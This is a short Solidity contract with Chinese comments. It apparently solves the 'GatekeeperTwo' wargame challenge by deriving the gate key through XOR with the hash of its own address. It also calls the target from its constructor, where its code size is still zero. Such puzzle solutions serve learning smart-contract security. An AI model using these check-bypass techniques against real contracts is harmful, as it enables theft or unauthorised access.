// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Exploit {

    // 传入目标合约的地址作为构造函数的参数
    constructor(address _target) {

        //实例化目标合约
        GatekeeperTwo gatkpr2 = GatekeeperTwo(_target);

        //计算_gateKey ，根据 a ^ b ^ a = b , 原 gateThree 等式两边同时 ^ keccak256(abi.encodePacked(this))。其中 this 指代本合约的地址 
        bytes8 _gateKey = bytes8(type(uint64).max) ^ bytes8(keccak256(abi.encodePacked(this)));

        //在构造函数中调用对方的函数，此时合约的代码大小尚为 0 
        //(bool result, bytes memory data) = address(_target).call(abi.encodeWithSignature("enter(bytes8)",_gateKey));
        gatkpr2.enter(_gateKey);
  }  
}